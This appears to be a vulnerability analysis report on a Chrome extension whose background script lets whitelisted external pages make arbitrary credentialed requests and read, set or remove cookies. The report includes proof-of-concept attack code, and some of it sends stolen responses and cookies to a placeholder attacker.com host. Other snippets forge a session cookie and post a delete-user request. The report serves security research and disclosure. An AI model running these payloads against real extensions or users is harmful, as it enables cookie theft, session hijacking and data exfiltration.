# CoCo Analysis: gfefaehopggffjmpodfdplcjkjbmlpnc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 37+ (grouped into 3 main vulnerability categories)

---

## Sink 1: bg_chrome_runtime_MessageExternal → jQuery_ajax_settings_url_sink (SSRF)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gfefaehopggffjmpodfdplcjkjbmlpnc/opgen_generated_files/bg.js
Line 967: _ajax(request.params, function (result, status, xhr) {
Line 1072: url: params.url,
Line 1074: data: params.data,
```

**Code:**

```javascript
// Background script (bg.js) - Lines 965-990
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if (request.method == "ajax") {
        _ajax(request.params, function (result, status, xhr) {
            sendResponse(result);  // ← Ajax result sent back to attacker
        }, function (xhr, errorType, error) {
            sendResponse({message: errorType});
        });
    } else if (request.method == "getCookies") {
        chrome.cookies.getAll(request.params, function (cookies) {
            sendResponse(cookies);  // ← Cookies sent back to attacker
        });
    } else if (request.method == "getCookiesStores") {
        chrome.cookies.getAllCookieStores(function (cookieStores) {
            sendResponse(cookieStores);  // ← Cookie stores sent back
        });
    } else if (request.method == "setCookie") {
        chrome.cookies.set(request.params, function (cookie) {
            sendResponse(cookie);  // ← Set arbitrary cookies
        });
    } else if (request.method == "removeCookies") {
        chrome.cookies.remove(request.params, function (params) {
            sendResponse(params);  // ← Remove arbitrary cookies
        })
    }
    return true;
});

// _ajax function (Lines 1068-1089)
function _ajax(params, onok, onerr) {
    onok = onok || function(){};
    onerr = onerr || function(){};
    var ajaxParam = {
        url: params.url,  // ← attacker-controlled URL
        type: params.type,  // ← attacker-controlled method
        data: params.data,  // ← attacker-controlled data
        async: params.async,
        dataType: params.dataType,
        contentType: params.contentType,
        xhrFields: params.xhrFields,  // ← attacker can set withCredentials
        success: function (result, status, xhr) {
            onok(result, status, xhr);
        },
        error: function (xhr, errorType, error) {
            onerr(xhr, errorType, error);
        }
    };
    // ... jQuery.ajax(ajaxParam)
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted external websites

**Attack:**

```javascript
// From whitelisted domains (*.aliexpress.com or yf.aezhushou.com)
// Attack 1: SSRF to internal resources
chrome.runtime.sendMessage(
    'gfefaehopggffjmpodfdplcjkjbmlpnc',
    {
        method: 'ajax',
        params: {
            url: 'http://localhost:8080/admin/secrets',
            type: 'GET',
            xhrFields: { withCredentials: true }
        }
    },
    function(response) {
        // Attacker receives response from internal endpoint
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);

// Attack 2: Steal cookies
chrome.runtime.sendMessage(
    'gfefaehopggffjmpodfdplcjkjbmlpnc',
    {
        method: 'getCookies',
        params: { domain: '.aliexpress.com' }
    },
    function(cookies) {
        // Attacker receives all cookies for the domain
        fetch('https://attacker.com/cookies', {
            method: 'POST',
            body: JSON.stringify(cookies)
        });
    }
);

// Attack 3: Set malicious cookies
chrome.runtime.sendMessage(
    'gfefaehopggffjmpodfdplcjkjbmlpnc',
    {
        method: 'setCookie',
        params: {
            url: 'https://www.aliexpress.com',
            name: 'session_id',
            value: 'attacker_controlled_session',
            domain: '.aliexpress.com',
            path: '/',
            secure: true
        }
    }
);

// Attack 4: SSRF with POST data
chrome.runtime.sendMessage(
    'gfefaehopggffjmpodfdplcjkjbmlpnc',
    {
        method: 'ajax',
        params: {
            url: 'https://api.aliexpress.com/admin/delete_user',
            type: 'POST',
            data: { user_id: 'victim123' },
            contentType: 'application/json',
            xhrFields: { withCredentials: true }
        }
    }
);
```

**Impact:** Multiple severe vulnerabilities:

1. **SSRF (Server-Side Request Forgery)**: Attacker can make arbitrary HTTP requests to any URL with the extension's elevated privileges, including internal/localhost endpoints, with full control over method, headers, data, and credentials.

2. **Cookie Theft**: Attacker can retrieve all cookies for any domain the extension has access to (including `.aliexpress.com`), enabling session hijacking and authentication bypass.

3. **Cookie Manipulation**: Attacker can set or remove arbitrary cookies for permitted domains, allowing session fixation, authentication bypass, and state manipulation attacks.

4. **Information Disclosure**: All responses from the SSRF requests and cookie operations are sent back to the attacker via sendResponse.

The extension has permissions for "cookies", "webRequest", and host permissions for `*://yf.aezhushou.com/*` and `*://*.aliexpress.com/*`. The externally_connectable whitelist includes these same domains, but according to the methodology, even a single whitelisted domain makes this a TRUE POSITIVE. An attacker who compromises or controls content on these whitelisted domains can fully exploit these vulnerabilities.

---

## Sink 2: cookies_source → sendResponseExternal_sink (Cookie Information Disclosure)

**Classification:** TRUE POSITIVE (covered by Sink 1 analysis)

This is part of the same vulnerability chain where cookies retrieved via `chrome.cookies.getAll()` are sent back to the attacker through `sendResponse()`.

---

## Sink 3: jQuery_ajax_result_source → sendResponseExternal_sink (SSRF Response Leak)

**Classification:** TRUE POSITIVE (covered by Sink 1 analysis)

This is part of the same vulnerability chain where the results from the SSRF attack (jQuery ajax responses) are sent back to the attacker through `sendResponse()`.
